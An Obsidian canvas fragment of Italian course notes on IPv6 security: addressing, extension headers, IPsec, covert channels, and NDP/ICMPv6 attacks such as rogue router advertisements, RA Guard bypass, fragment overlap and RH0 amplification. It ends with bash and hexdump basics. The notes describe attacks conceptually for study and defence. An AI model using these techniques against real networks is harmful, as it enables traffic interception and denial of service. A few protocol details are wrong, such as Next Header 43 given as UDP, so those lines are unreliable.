		{"id":"62c18499ff705672","type":"text","text":"# Indirizzi Multicast\n\nGli indirizzi ***multicast*** iniziano con `1111 1111`. Seguono:\n\n- `4 bit` di `flag`, che di norma sono sempre `0`;\n- `4 bit` di `scope`, che servono a dire \"quanto lontano\" può andare il pacchetto. Il valore `1` mi dice di propagarlo solo nell'indirizzo di `loopback`, `2` è sul link locale, `5` è \"`site local`\" (i.e. all'interno della rete aziendale), `8` è un'organizzazione distribuita, `E` significa che, se permesso, può andare su Internet;\n- `112 bit` di `group ID`, che serve a capire a chi mandare il messaggio. A parità di `flag` e `scope` (e.g. `0` e `2`, i.e. sul link fisico) posso avere diversi target distinti dal `group ID`:\n\t- `::1` di fatto è un **broadcast** (da dire a bassa voce, che sennò RFC 4291 si incazza, ma di fatto è quello. Il kernel ti iscrive a questo gruppo multicast ogni volta che assegni un'indirizzo `IPv6` ad un'interfaccia, quindi poche chiacchiere);\n\t-  `::2` è rivolto a tutti i router (mentre `::9` è per `All RIP routers`);\n\t- `::1:2` è `All DHCP servers`, e così via.\n\nNota che formalmente `::1` non è un `broadcast`. Come scritto nel riquadro sopra, viene tutto mappato sul `multicast ethernet`. <span style=\"color:rgb(236, 155, 14)\">Onestamente non ho capito a che serve insistere su questa cosa...</span>\n","x":-13610,"y":13932,"width":759,"height":557,"color":"4"},
		{"id":"9a31e35de575334d","type":"text","text":"# Indirizzi Link Local\n\nSe il singolo link fisico (e.g. un cavo ethernet) fosse una sottorete, un indirizzo `IPv6` di tipo `Link Local` farebbe le veci di un indirizzo `MAC`. È quindi obbligatorio averne almeno uno per ogni interfaccia `IPv6`, altrimenti l'`host` non sarà in alcun modo raggiungibile. Non compaiono nelle tabelle di routing, i.e. non possono essere instradati su Internet.\n\nPosto che iniziano quasi sempre per `FE80::/64` (ma arrivano fino a `FEBF`, ricordando che fisso solo i primi `3 bit`), posso generarne uno\n\n- in modo manuale (tipicamente scelto per i router, e.g. `FE80::2`);\n- randomizzando gli ultimi `64 bit` (è improbabile sceglierne due uguali sullo stesso link);\n\t- Eh ok ma se succede? Esiste il protocollo di ***Duplicate Address Detection*** (***DAD***) che, prima di usarlo, si assicura che il `Link Local` generato sia unico;\n\t- Usato da Windows e Linux.\n- sfruttando il `MAC` univoco di partenza (***EUI-64***, `Extended Unique Identifier`): prendo i `48 bit` originali (flippando il settimo `bit`, \"don't ask why\") e ci aggiungo in mezzo i `16 bit FFFE`. Questa sequenza costituisce quindi la \"firma\" di `EUI-64`.\n\t- Nota che questo rende la parte host statica, indipendentemente da dove mi trovo o quando mi connetto, il che può essere un problema se sono un fissato di privacy;\n\t- Usato da MacOS.","x":-12601,"y":13932,"width":759,"height":557,"color":"4"},
		{"id":"d3263c1925ddb36c","type":"text","text":"# IPv6\n\nLe prime tre versioni di `IP` non sono state neanche rilasciate ufficialmente, la quarta ha finito gli indirizzi assegnabili e la quinta è stata un mezzo fallimento. La sesta è uscita bene.\n\nUn indirizzo `IPv6` è un identificativo a `128 bit` ($\\sim 3.4\\cdot 10^{38}$ indirizzi) raggruppati in `8` gruppi da `16 bit` spesso rappresentati con notazione esadecimale (`16 bit`$\\to$ `4 hex`):\n```\n2001:0DB8:AAAA:1110:1000:0000:0000:0100\n```\n\nQuesto permette di implementare Internet per come era stato pensato all'inizio: connessioni dirette tra coppie di indirizzi (i.e. senza usare il NAT).\n\nRispetto ad `IPv4`, porta diverse migliorie generali:\n\n- L'header ha ***lunghezza fissa***, so già dov'è il payload e posso leggerlo in parallelo;\n- Niente checksum (ci pensano i protocolli superiori)\n- La ***frammentazione*** non viene più gestita dai router, ma solo end-to-end (tramite un apposito ***Extension Header***. Questo significa che se ad un certo punto un pacchetto supera l'MTU viene scartato (il router che lo fa avvisa il mittente con un messaggio `Packet Too Big`), e richiede di esplorare preventivamente il percorso con un algoritmo di ***Path MTU Discovery*** (***PMTUD***) che sfrutta ***ICMPv6***;\n- Prevede un parametro `flow label` per sviluppi futuri (il controllo di flusso secondo etichetta da parte dei router non è ancora implementato su Internet);\n- Implementa bene l'***anycast*** (i.e. la consegna al più vicino nodo avente un tale indirizzo `anycast`, che similmente al `multicast` è condiviso da più host). Non approfondiamo;\n- La lunghezza complessiva del datagramma è molto minore rispetto ad `IPv4`.\n\nEssendo attualmente la stragrande maggioranza dei router solo `IPv4`, per trasmettere un pacchetto `IPv6` su Internet devo spesso incapsularlo come payload dell'`IPv4` (***tunneling***).","x":-11592,"y":14724,"width":759,"height":829,"color":"6"},
		{"id":"ba56104a8caea034","type":"text","text":"# Extension Headers\n\nL'`header` `IPv4` ha dimensione variabile a causa delle `options`. Con `IPv6` l'abbiamo reso a dimensione fissa, sempre `40 bytes` (tra le altre cose, così evito anche  di distinguere tra `header size` e `total size`). Questo perché il `99%` dei pacchetti non usava opzioni: `\"usiamo un protocollo semplice, complichiamo solo se serve\"`, dice `IPv6`.\n\n\"`Complichiamo se serve`\" ci fa capire che forse tutto sommato aveva un senso che il vecchio `header` avesse dimensione variabile. Il campo `Next Header` specifica in che modo interpretare i `40 byte` che seguono l'`header`, ma questo può essere tanto un `header` di un protocollo (e.g. `6 TCP`, `17 UDP`, `58 ICMPv6`) quanto un ***Extension Header***, i.e. un `header` contenente opzioni aggiuntive (al quale eventualmente ne segue un altro, e un altro, finché alla fine non si arriva all'`header` del protocollo di livello superiore).\n\nPer quanto detto, il `99%` dei pacchetti non avrà alcun `Extension Header`, ma in quell'`1%` c'è roba interessante:\n\n- `0` - Il primo `extension header` è per le opzioni `hop-to-hop` (i.e. roba che ogni router che forwarda quel pacchetto deve leggere). Quasi inutilizzato, rallenta troppo;\n\t- Segue che di norma gli `extension header` vengono analizzati solo end-to-end.\n- `43` - Il `routing header` permette al sender di specificare una sequenza di router da cui il pacchetto deve passare. Quasi inutilizzato per motivi di sicurezza;\n- `44` - `fragmentation`, gestisce la frammentazione;\n- `50` - Il più usato. Con ***Encapsulating Security Payload*** (***ESP***) fornisco authentication, integrity ed encryption già al livello di rete. Ci implemento ***IPsec*** e le ***VPN***;\n- `51` - ***Authentication Header*** (***AH***), protegge l'header dalle manomissioni con un hash. Questo chiaramente è in conflitto con il NAT, motivo per cui si usa poco.\n\t- L'hash utilizzato come `Message Authentication Code` ($\\so$ `HMAC`) viene calcolato sui parametri immutabili (e.g. non avrebbe senso includere il `TTL`, visto che cambia ad ogni hop) e poi firmato con una chiave concordata (e.g. con `MD5`, `SHA-1` o `AES-CBC`).\n\nIn teoria c'è un ordine ben definito per questi `header`: `hop-to-hop`, `destination options`, `routing`, `fragmentation`, `authentication (AH)`, `security (ESP)`, `destination options`, `upper layers` (`destination options` compare due volte perché il primo viene letto dai router indicati dall'`header` di `routing`, mentre il secondo solo dal destinatario finale).\n\nIn pratica nessuno mi obbliga. Scambiando l'ordine degli `EH` posso ottenere comportamenti imprevedibili (dipende molto dalla specifica implementazione), incluso ***bypassare il firewall*** (che in teoria dovrebbe droppare pacchetti mal formati). In teoria ognuno di questi `EH` dovrebbe apparire una sola volta, ma nulla mi vieta di violare la regola (e di nuovo, il firewall dovrebbe droppare, ma visto che difficilmente implementa un controllo approfondito non sempre lo fa).","x":-12601,"y":16580,"width":759,"height":1011,"color":"4"},
		{"id":"27f0f42d77169284","type":"text","text":"# Covert Channels\n\nUn **covert channel** (canale nascosto) è un modo non previsto per **comunicare informazioni in segreto**, sfruttando **mezzi che non erano pensati per trasmettere dati**.\n\nIn `IPv6`, posso usare i campi `traffic class` (`8 bit`, che dovrebbe essere `0` a meno che non uso QoS) e `flow label` (`20 bit`, come sopra) per trasmettere informazioni. In particolare, posso mettermi d'accordo per dire che `quello che scrivo in Traffic Class devi interpretarlo come ASCII`, o simili. Chiaro che mi tocca creare questi pacchetti manualmente (tipo con `scapy`, `raw sockets` o moduli del `kernel`) e il destinatario deve sniffarli prima che vengano decapsulati.\n\nNella pratica si tende a usare `UDP` o `ICMPv6` per non attirare troppo l'attenzione. Se in mezzo c'è un buon IDS può rendersi conto che questi campi hanno un'***entropia*** troppo alta (ricordiamo che di norma dovrebbero essere entrambi `0`, soprattutto `flow label` che è praticamente inutilizzato).\n\nPosso ovviamente codificare roba anche dentro la lunghezza del payload (`16 bit`), e in generale l'unico limite alla creazione di un Covert Channel è la fantasia.","x":-10580,"y":15788,"width":759,"height":557,"color":"4"},
		{"id":"872849ac9e683f6f","type":"text","text":"# `AH`, `ESP` & `IKE`\n\nCome detto, per implementare la sicurezza su `IP` possiamo usare sia `AH` che `ESP`. Sappiamo anche che `AH` è poco usato per via del conflitto con il `NAT`, ma non è l'unico motivo. `ESP` può infatti implementare *anche* l'autenticazione, ma solo limitatamente al `payload` (`AH` autentica anche porzioni scelte del proprio `header`). In pratica, `ESP` resta il più usato, ma scenari particolari potrebbero richiedere l'uso di entrambi.\n\nTutto questo ci serve per implementare il concetto di ***IPsec***, e conseguentemente di ***VPN***. Come? \n\n- Quando `Alice` vuole inviare un messaggio a `Bob`, il `kernel` di `Alice` controlla il ***Security Policy Database*** (***SPD***), in cui sono contenute tutte le ***Security Policies*** da applicare in base al destinatario del messaggio. Assumiamo che `Bob` vi compaia: bisogna usare `IPsec`;\n\t- Questa fase specifica sia quale `EH` usare (`AH`, `ESP`), la modalità (`transport`, `tunnel`), azioni (`secure`, i.e. usa `IPsec`, `bypass`, i.e. non usarlo, ma anche `drop`, tipo firewall) e parametri vari (e.g. il `TTL` della policy);\n\t- Una voce `secure` ha struttura `protocol/mode/src-dst/level`, dove il primo campo si riferisce a `AH/ESP`, il secondo a `tunnel/transport`, il terzo agli `endpoint` del `tunnel` (se siamo in modalità `tunnel`) e l'ultimo a quanto è rigida la richiesta di usare `IPsec` (e.g. il valore `use` ti dice tipo `se c'è una SA usala, sennò manda in chiaro`, mentre `require` è più tipo `non mandare nulla verso questo indirizzo che non sia IPsec`);\n\t- `AH` e `ESP` hanno voci diverse nel DB, così come distinguo i flussi `in`, `out` e `forward`.\n- La palla passa al modulo del `kernel` che gestisce `IPsec`. Sia `AH` che `ESP` hanno bisogno di chiavi e parametri specifici del destinatario, detti nel complesso ***Security Association*** (***SA***).\n\t- Ogni SA è unidirezionale, i.e. per una comunicazione bidirezionale devo negoziarne due;\n\t- Una volta stabilita una SA, il `kernel` la salva nel ***Security Association Database*** (***SAD***). In questo modo non sarà costretto a rinegoziare continuamente i parametri crittografici;\n\t- Ogni SA è identificata da un ***Security Parameters Index*** (***SPI***), i.e. la chiave del SAD. Questo perché posso distinguere diversi flussi con lo stesso destinatario, ed è comodo inserirlo nell'`header` in modo da trovare subito i parametri necessari alla decodifica. Per il resto, una entry del SAD è simile ad una del SPD (in aggiunta abbiamo i protocolli usati, le relative chiavi, i numeri di sequenza per proteggere da attacchi di `replay`, ecc...).\n- \"Negoziare\" in questo contesto significa usare un protocollo di ***Key Management***, e.g. ***IKE*** (***Internet Key Exchange***, preferibilmente nella versione `IKEv2`) o `ISAKMP`. Questo si traduce in un classico ***Diffie-Hellman*** o varianti dello stesso concetto.","x":-12604,"y":17826,"width":762,"height":1011,"color":"4"},
		{"id":"7854b43144ded0e8","type":"text","text":"# `IPsec`\n\nCon il termine `IPsec` intendiamo un insieme di protocolli aventi come obiettivo la sicurezza su `IP`. In particolare su `IPv6` è nativo (`Extension Header` `ESP` e `AH`), mentre su `IPv4` è stato necessario definire i due `EH` come nuovi protocolli (rispettivamente `50` e `51`).\n\n`IPsec` può lavorare in due modalità:\n\n- ***Transport Mode*** - Qui c'è un solo pacchetto `IP`, come in una situazione \"standard\", ne proteggo il `payload` ed eventualmente l'`header` (i.e. proteggo il layer di Trasporto e parzialmente quello di Rete). Tipicamente usato in `host-to-host`;\n- ***Tunnel Mode*** - Qui incapsulo un altro pacchetto `IP` come `payload` e lo proteggo per intero (i.e. proteggo il layer di Rete). Usato in `site-to-site`, di norma per implementare una ***VPN***.\n\n","x":-11592,"y":18053,"width":759,"height":557,"color":"6"},
		{"id":"817b81d5520b5ba7","type":"file","file":"Area Lab2 - IPv6/ExtensionHeader_Order.png","x":-13600,"y":17826,"width":759,"height":370},
		{"id":"79b5133112c8cb62","type":"text","text":"# Problemi con gli Extension Headers\n\nEsempi comuni di attacchi con gli `EH` riguardano:\n\n- ***Routing*** -  Specificare la lista di router da cui voglio passare mi consente di scrivere uno spropositato numero di volte una roba tipo `A B A B A B ...`, di fatto creando un attacco di ***traffic amplification***. O meglio, questo avviene con un particolare formato di `Routing Header`: ***`RH0`***. Ovviamente è ***deprecato***, se lo vedi devi buttarlo via subito. Ne hanno fatti altri, e.g. `RH1` (deprecato anch'esso), `RH2`, `RH3`, ... non approfondiamo;\n- ***Fragmentation*** - Ci sono diversi modi di sfruttarlo per rompere le scatole.\n\t- Posso frammentare i pacchetti in modo tale che ci sia un ***overlap*** (e.g. il primo è lungo `10`, nel secondo scrivo che l'`offset` è `8`, i.e. gli ultimi due `byte` del primo frammento si sovrappongono ai primi due `byte` del secondo). Questo tipo di situazione non è gestita esplicitamente dal protocollo $\\so$ ***fuzzy***;\n\t\t- In teoria RFC 5722 dà come BCP \"droppa tutto\", ma come sempre nessuno segue le BCP e ognuno ha una propria ***reconstructing policy***.\n\t- Posso non inviare l'ultimo frammento. Il destinatario si ritroverà ad aspettarlo tipo Godot consumando risorse a vuoto $\\so$ ***DoS***, tipo in un **TCP SYN Attack** in cui lascio appese `N` aperture di connessioni senza completarle o in uno **Slowloris HTTP** in cui mando lentamente richieste `HEAD` incomplete tenendo viva la connessione con `\\r\\n` periodici ed esaurendo i socket disponibili del server;\n\t\t- Si risolve con un ***timer*** oltre il quale scarti tutto.\n\t- Posso banalmente scrivere `offset=0` e `M=0` (i.e. di fatto non è un frammento, c'è solo un pacchetto). Questo inaspettatamente manda in crisi gli host, che se vedono un `Fragmentation Header` si aspettano più frammenti;\n\t\t- Anche qui, la scelta migliore è buttarli prima che facciano casino.\n- Di norma uno switch si aspetta che i messaggi di `Router Advertisement` arrivino sempre dalla stessa porta, e ha dei meccanismi (***RA Guard***) per scartare quelli in arrivo su porte diverse. In teoria così è difficile fingersi un router: se vedo che il campo `Next Header` è `58` (`ICMPv6`) ispeziono e controllo che vada tutto bene. Posso però usare un altro `EH` (e.g. `Fragmentation` o `Destination Options` per fregare questo controllo, mettendolo tra lui e il messaggio `ICMPv6`. Può quindi tranquillamente arrivare ovunque una `RA` tarocca.\n\t- La BCP a riguardo è cestinare messaggi di NDP frammentati (di norma sono corti, che senso avrebbe frammentarli?). E quelli che sfruttano `Destination Options`? La migliore BCP (in generale) è ***droppare tutti i pacchetti di NDP che contengono `EH` non necessari***.\n\t- \"Ma lo switch non è un elemento `L2`?\". Sì, ma ovviamente ci sono quelli più svegli, chiamati `smart` o `L2+`, e possono arrivare a filtrare fino al livello di trasporto.","x":-13610,"y":16580,"width":759,"height":1011,"color":"4"},
		{"id":"48669210c517d8c3","type":"text","text":"# Struttura di un Pacchetto `IPv6`\n\nL'`header IPv6` è molto più semplice di uno `IPv4`. Sono sempre `40 byte`, così divisi:\n\n- `Version` - `4 bit` per scrivere `0110` (i.e. il `6` di `IPv6`). Inaspettato, ve?\n- `Traffic Class` - `8 bit` per specificare il livello di ***priorità*** del pacchetto (e.g. `VoIP` ha priorità alta, perché deve garantire bassa latenza);\n- `Flow Label` - `20 bit` per identificare i ***flussi di traffico***, e.g. se tutti i pacchetti della mia connessione Netflix hanno la stessa label, il router non ha bisogno di arrivare a leggere la `Destination` e consultare la `Routing Table` (riduco l'overhead di calcolo);\n- `Payload Length` - `16 bit`, autoesplicativo;\n- `Next Header` - `8 bit` per specificare ai dissectors del layer superiore come leggere l'`header` incapsulato all'interno del payload (e.g. `6 = TCP`, `43 = UDP`);\n\t- Dal momento che non si usavano quasi mai, `IPv6` ha rimosso molte opzioni previste da `IPv4`. Se servono posso però aggiungerle in un secondo `header` che metto nel payload (e.g. `44` indica la presenza di un ***Extension Header*** che gestisce la frammentazione, `50` e `51` sono usati per implementare ***IPSec***).\n- `Hop Limit` - `8 bit`, è identico a `TTL` di `IPv4`;\n- `Source Address` - `128 bit`, autoesplicativo. È sempre un indirizzo ***unicast***;\n- `Destination Address` - `128 bit`, autoesplicativo. Può appartenere a qualsiasi classe.","x":-12601,"y":15788,"width":759,"height":557,"color":"4"},
		{"id":"acbfb7d40b4eec22","type":"text","text":"# Sicurezza `IPv6` (cfr. Laboratori 3 e 5)\n\nSe da un lato dormiamo sonni più tranquilli perché l'infinità di indirizzi `IPv6` rende di fatto impossibile attacchi di tipo *enumeration* sulle reti (che hanno $2^{64}$ possibili host), dall'altro ci sono ovviamente altri modi di attaccare il protocollo (tra cui `ICMPv6` stesso).\n\nIl meccanismo degli ***extension header*** (***EH***) ha ad esempio un duplice impatto:\n\n- Da un lato permette di implementare ***IPsec***, garantendo i tre pilastri CIA al livello di rete;\n- Dall'altro porta criticità discendenti dalla non-standardizzazione delle implementazioni.\n\nIn che senso? Spesso le regole sugli `EH` sono più che altro delle ***Best Common Practices*** (***BCPs***), che di fatto possono essere disattese. Chiedersi se un dispositivo supporta `IPv6` non apre a risposte \"sì/no\", ma piuttosto ad una pletora di implementazioni diverse.\n\nPer capirci, in teoria gli `extension header` hanno un ordine preciso e non vanno ripetuti, in pratica un controllo di questo tipo richiederebbe ai ***firewall*** di ispezionare l'intera chain di `EH`. Essendo opzionali, nessun firewall avrà mai come impostazione di default quella di guardarseli tutti. A destinazione arriveranno quindi pacchetti formati in modi eterogenei, e no, non li scarti tutti a priori, provi a capire cosa farci. Ma ognuno interpreta a modo suo.\n\nSegue che il ***fuzzing*** è facilissimo. Posso ottenere gli effetti più disparati, da un ***bypass del firewall*** ad inserire informazioni in posti inattesi creando ***covert channels***.","x":-11592,"y":16800,"width":759,"height":571,"color":"6"},
		{"id":"b987e06dc22f5856","type":"text","text":"# Host Discovery\n\nNonostante sia vero che è inverosimile fare brute force per trovare gli host entro la rete, ci sono metodi alternativi. Gli indirizzi non sono sempre completamente casuali, tipo\n\n- potrei assegnare al router l'indirizzo statico `2001:DB8:1::1` per renderlo riconoscibile;\n- potrei usare un \"wordy address\", e.g. `2001:DB8:1::dead:beef`;\n- potrei appiccicare il corrispettivo `IPv4`, e.g. `2001:DB8:1::100.100.1.1` (sì, sono notazioni diverse, lo so, ma sono pigro).\n\nChiaro è che per evitare questa cosa devo usare indirizzi \"hard-to-guess\" (vedi Laboratorio 2 `Ex2`), e comunque non sempre è sufficiente (se l'attaccante si mette a sniffare può vedere il source address dei pacchetti).\n\n\"Ma io ho solo settato l'indirizzo, non lo uso per mandare roba in rete\". Eh no, anche se pensi di star usando solo `IPv4`, i dispositivi `IPv6` possono generare traffico inaspettato. Per convincertene, sniffa i pacchetti in una rete in cui pensi di non stare usando `IPv6` (basti pensare ai vari messaggi del protocollo di Neighbor Discovery).","x":-10580,"y":16570,"width":759,"height":470,"color":"4"},
		{"id":"67d9d350a9d88932","type":"text","text":"# Attaccare con `ICMPv6`\n\nQui è buona pratica vietare alcune cose, e c'entra più o meno sempre il multicast.\n\n- Se rispondo con un messaggio di errore ad un pacchetto `multicast` rischio di essere solo un pezzetto di un piano più grande: l'attaccante sa benissimo che questa richiesta produrrà un errore, quindi la manda a nome di qualcun altro (***spoofing***) e si gode il bombardamento di risposte (***DDoS***) sorseggiando un Martini;\n\t- Potrebbe anche banalmente usarlo per vedere chi risponde (***host discovery***).\n- Sarebbe meglio vietare le `echo reply` a `echo requests multicast`. Questo è il caro vecchio ***smurf attack***: mando a nome tuo un `ping` a `tutti` e mi godo il ***DDoS***;\n- Con un messaggio di ***Redirect*** posso creare di fatto nuove entries nelle routing tables e far passare da me il traffico che non dovrebbe.\n\nQuesto ovviamente è il gioco base, perché si poteva fare anche con `ICMPv4`. L'espansione prevede i messaggi che costituiscono il ***Neighbor Discovery Protocol***.","x":-10580,"y":17136,"width":759,"height":455,"color":"4"},
		{"id":"f1954071048d5aa7","type":"file","file":"Area Lab2 - IPv6/ICMPv6_ErrorMessages.png","x":-9700,"y":17202,"width":590,"height":324},
		{"id":"54c812664bfc46c0","type":"text","text":"# Attacchi sul Neighbor Discovery Protocol\n\n Il primo attacco che viene in mente su NDP è ***spoofing***, generalmente con lo scopo di ottenere ***redirection*** del traffico. Mando una `NS` (o una `Unsolicited NA`) a nome dell'`IP` target ma con il mio `MAC`, se non viene contrastata ricevo il suo traffico (simile ad ***ARP Cache Poisoning***). Posso anche realizzarlo mettendomi in mezzo durante la ***Neighbor Unreachability Detection*** (***NUD***, i.e. mando periodicamente delle `NS` per capire se il mio vicino è ancora online): basta che l'attaccante risponda prima del target.\n\nPosso anche impedire che un nuovo host si auto-assegni un indirizzo `IPv6` con SLAAC. Nel protocollo di DAD basta rispondere continuamente `no, non puoi scegliere questo indirizzo, ce l'ho già io`. Di fatto è un ***DoS***.\n\nPosso realizzare un DoS anche facendo flooding di messaggi provenienti da `IP` inesistenti. Chi li vede aggiorna la propria cache dicendo tipo `oh, questo IP è un mio vicino!` e prova a rispondere. È chiaro che entro pochi secondi si renderà conto che dall'altra parte non c'è nessuno, ma se l'attaccante è abbastanza bravo gli satura la cache prima che il target si renda conto di essere sotto attacco.\n\nGli attacchi più potenti sfruttano le ***Router Advertisement***: se riesco a fingermi un router\n\n- Posso convincere gli host che un certo prefisso di rete è direttamente connesso sul link. Tipo, potrei dire che `2001:DB8:cafe::/64` è disponibile all'indirizzo `FE80:BAD::1`, che magari è un mio indirizzo secondario. Risultato? Tutto ciò che volevi mandare all'`IP` legittimo finisce nelle mani dell'attaccante. A quel punto posso farci quello che voglio: ***impersonare*** il servizio che voleva raggiungere il target, buttare i pacchetti (***DoS***, perché il target conosce solo questa via per raggiungere quel servizio), o fare ***MitM***;\n- Quanto detto sopra si sposa molto bene con un servizio `DNS` ***bogus*** (nuova parola per dire tipo \"malicious\"). Se realizzo un DoS o un MitM, sarebbe proprio conveniente che `2001:DB8:cafe::/64` risulti essere `google.com` o il sito della tua banca. Questo si ottiene con i `flag M=1` (i.e. `Managed`, non usare `SLAAC` ma `DHCPv6`) e `O=1` (i.e. se hai già un indirizzo, usa comunque il server `DHCPv6` per i parametri di rete) delle `RA`, ma non basta. Non posso mandarti l'`IP` del server bogus come payload, `IPv6` vuole che sia tu ad inviare un multicast `FF02::1:2` a tutti i server `DNS`, sta a me assicurarmi che se ce ne sono altri legittimi questi non riescano a rispondere per primi (e.g. DoS);\n- Posso dare agli host un prefisso di rete sbagliato per generare un indirizzo incoerente con il resto della topologia: lo rendo irraggiungibile o mi propongo come default gw.\n\nLe soluzioni si basano fortemente sugli ***smart switches***, che imparano le associazioni `porta/MAC` con tecniche come ***RA Guard*** (imparo dove sono i router) o ***Snooping*** (i.e. anti-spoofing a livello `IPv6`). BCP è anche vietare l'autoconfigurazione o implementare ACLs.","x":-10580,"y":17826,"width":759,"height":1011,"color":"4"},
		{"id":"9881c7b58ef23020","type":"file","file":"Area Lab2 - IPv6/RH0_TrafficAmplification.png","x":-14619,"y":16832,"width":759,"height":508},
		{"id":"4722939b2561a6a6","type":"text","text":"antispoofing: oltre all'ingress filtering (come fatto nell'HW) posso fare reverse path forwarding (i.e. quando arriva pacchetto da `A`, io ne genero uno per `A`. Se segue un path diverso, verosimile spoofing).","x":-11592,"y":13932,"width":481,"height":259},
		{"id":"04825a06a9d94d59","type":"text","text":"# Bash - Controllo di Flusso\n\n```bash\nfor f in ./*; do echo \"file $f: \"; cat \"$f\"; echo; echo; done\n```\n\nQuesta è la ***concatenazione*** di comandi bash con cui si può risolvere il livello 4. In generale:\n\n- `comando &` esegue il `comando` in ***background***;\n- `c1; c2` esegue prima `c1` e poi `c2`, ***indipendentemente dall'esito*** del primo;\n- `c1 && c2` esegue `c2` solo se `c1` ha ***successo*** (i.e. `exit status 0`);\n- `c1 || c2` esegue `c2` solo se `c1` ***fallisce*** (e.g.  `mkdir prova || echo \"errore\"`).\n\nQualsiasi comando ha due tipologie di output: ***`stdout`*** per i risultati ordinari e ***`stderr`*** per gli errori. Se non viene specificato diversamente, entrambi vengono stampati su terminale. Altrimenti, entriamo nel mondo degli ***operatori di reindirizzamento***:\n\n- `comando > file` sovrascrive `file` con lo `stdout` di `comando`, mentre `comando >> file` lo aggiunge in coda (`append`);\n- `comando 2> file` e `comando 2>> file` discorso analogo, ma con `stderr`;\n\t- Posso anche dare entrambi i comandi insieme, e.g. `comando > file 2> errors` reindirizza `stdout` in `file` e `stderr` in `errors`;\n\t- Molto comune è la scrittura `2> /dev/null`, che reindirizza gli errori in un file che fa le veci di un buco nero in cui tutto viene distrutto (per un output più pulito). \n- `comando &> file` reindirizza entrambi, e anche lui ha il suo analogo in versione `append` con `comando &>> file.log`. Questa sarebbe la forma abbreviata di `comando > output 2>&1`, cioè `metti stdout in output, e stderr dove hai messo stdout`;\n\t- È l'unico caso in bash in cui `&` viene usato come \"puntatore\" (allo stream `1`).\n- `comando < file` usa `file` come input per `comando`;\n- `c1 | c2` esegue `c1`, quindi passa il suo output come input di `c2`.\n\t- I comandi \"telefonati\" da usare con `|` sono `grep` e `tee` (`comando | tee file` mostra l'output di `comando` a schermo e lo salva anche su `file`).\n","x":3257,"y":5899,"width":759,"height":797,"color":"4"},
		{"id":"efbeb23d6fccc658","type":"text","text":"# Script Bash\n\nOgni ***script bash*** inizia con `#!/bin/bash`. Perché? Bash è un ***linguaggio interpretato***, e questo simpatico operatore `#!` (detto ***shebang***, da `sharp (#) + bang (!)` se te lo stessi chiedendo) serve a specificare il percorso dell'interprete da usare. Per capirci, se scrivi `#!/usr/bin/python3` e poi esegui `./script.py`, questo verrà interpretato in automatico da `python3`, senza bisogno di scrivere sulla shell `python3 script.py`. \"Quindi posso non mettere `#!/bin/bash` e scrivere direttamente sulla shell `bash script.sh`?\". Sì, ma basta con le digressioni, andiamo avanti.\n\nTutti questi operatori ci portano con molta naturalezza a voler mettere un botto di comandi in fila utilizzando i costrutti fondamentali di un qualsiasi linguaggio di programmazione.\n\nTutti i costrutti che seguono possono essere scritti come singola riga. In quel caso, gli \"a capo\" si sostituiscono con l'operatore `;`. Partiamo con l'`if` e vediamo un esempio:\n\n```bash\nif [[ condizione ]]; then\n\tcomando1\n\tcomando2\nelif [[ altra condizione ]]; then\n\tcomando3\nelse\n\tcomando4\nfi\n```\n\nChe su una sola riga diventa\n\n```bash\nif [[ condizione ]]; then comando1; comando2; elif [[ altra condizione ]]; then comando3; comando4; else comando4; fi\n```\n\nPuò essere utile `case`, quando mettere troppi `elif` diventa noioso:\n\n```bash\ncase variabile in\n\tpattern1) comando1 ;;\n\tpattern2) comando2 ;;\n\t...\n\t*) comando_default ;;\nesac\n```\n\nSeguono i `loop`: `for`, `while` e poi boh, a qualcuno evidentemente non andava di scrivere `while [[ ! condizione]]` (che continua a girare finché `! condizione` non diventa `True`) e si è inventato `until [[ condizione ]]` (gira finché `condizione` non diventa `False`).\n\n```bash\nfor var in elenco; do\n\tcomando1\n\tcomando2\ndone\n```\n\n```bash\nwhile [[ condizione ]]; do\n    comando1\n    comando2\ndone\n```\n\n```bash\nuntil [[ condizione ]]; do\n    comando1\n    comando2\ndone\n```\n\nIn basso segue come definire le funzioni.","x":4266,"y":5900,"width":759,"height":1541,"color":"4"},
		{"id":"28c7fa5a4a2add1f","type":"text","text":"# Hexdump\n\nI programmi aprono i `file` basandosi sull'estensione, scelgono cosa mostrare o non sono in grado di rappresentare correttamente tutte le informazioni in esso contenute. Questo significa che il vero controllo è sui singoli `byte`. Ma come li leggo?\n\nAnzitutto converto l'intero `file` in binario (o meglio, in esadecimale, che altrimenti è una roba illeggibile). Questa roba si fa con `hexdump`, preferibilmente con opzione `-C`, che stampa un formato più user-friendly di tipo\n\n```\n# OFFSET                # VALORI BYTES                           # ASCII\n0001ff00  50 4b 05 06 00 00 00 00  01 00 01 00 5a 00 00 00  |PK..........Z...|\n```\n\n`OFFSET` indica il primo `byte` che compare in `VALORI BYTES`. Il `byte 1ff00` assume valore esadecimale `50` (`80` in decimale), che in `ASCII` indicizza il carattere `P`. In questo caso, `50 4b` (i.e. `PK`) è il ***magic number*** di un file `.zip`, mentre `05 06` identifica la fine di un file `.zip` (`End of Central Directory Record`).\n\nQuesto per dire che i dati nascosti includono il reale formato del file, indipendentemente dall'estensione che risulta nel `filesystem`. Esempi di magic numbers sono `89 50 4E 47` (`PNG`), `FF D8 FF` (`JPEG`) e `7F 45 4C 46` (`ELF`, i.e. eseguibile Linux), e si trovano all'inizio della prima riga dell'`hexdump`.\n\nAltra cosa comune è individuare la presenza di ***metadati***. Un file `mp3` può ad esempio contenere, oltre alla musica, informazioni quali `titolo`, `artista` e via dicendo. Questi dati vengono spesso ignorati da un `media player`, ma stanno là!\n\n```\n0001fa20  49 44 33 04 00 00 00 00  00 21 54 49 54 32 00 00  |ID3......TIT2..|\n```\n\nIn questo esempio `ID3` rappresenta il formato dei metadati su `mp3`. Questa riga del file di `hexdump` indica che a partire dal `byte 1fa20` troveremo i metadati sulla traccia audio.\n\nAltri esempi di metadati sono i formati `EXIF` (per `JPEG`) e `XMP` (su `PDF Adobe`).\n\nInfine, ovviamente, tutto questo si può usare per nascondere messaggi nei `file`.","x":5275,"y":5900,"width":759,"height":951,"color":"4"},
